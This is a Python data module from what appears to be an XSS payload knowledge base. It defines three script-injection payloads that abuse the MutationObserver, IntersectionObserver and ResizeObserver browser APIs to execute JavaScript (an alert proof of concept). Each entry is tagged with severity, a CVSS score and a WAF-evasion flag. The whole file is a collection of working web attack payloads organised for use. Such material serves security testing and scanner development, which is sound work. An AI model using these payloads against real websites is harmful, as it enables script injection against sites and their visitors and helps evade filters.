#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Observer API XSS Payloads
"""

from ..models import PayloadEntry


MUTATION_OBSERVER_PAYLOADS = {
    "mutation_observe": PayloadEntry(
        payload="<script>new MutationObserver(()=>alert(1)).observe(document.body,{childList:true});document.body.appendChild(document.createElement('div'))</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="MutationObserver trigger",
        tags=["mutation", "observer"],
        waf_evasion=True,
        reliability="high",
    ),
}

INTERSECTION_OBSERVER_PAYLOADS = {
    "intersection_observe": PayloadEntry(
        payload="<script>new IntersectionObserver(()=>alert(1)).observe(document.body)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="IntersectionObserver trigger",
        tags=["intersection", "observer"],
        waf_evasion=True,
        reliability="high",
    ),
}

RESIZE_OBSERVER_PAYLOADS = {
    "resize_observe": PayloadEntry(
        payload="<script>new ResizeObserver(()=>alert(1)).observe(document.body)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="ResizeObserver trigger",
        tags=["resize", "observer"],
        waf_evasion=True,
        reliability="high",
    ),
}

# Combined database
OBSERVERS_DATABASE = {
    **MUTATION_OBSERVER_PAYLOADS,
    **INTERSECTION_OBSERVER_PAYLOADS,
    **RESIZE_OBSERVER_PAYLOADS,
}
OBSERVERS_TOTAL = len(OBSERVERS_DATABASE)
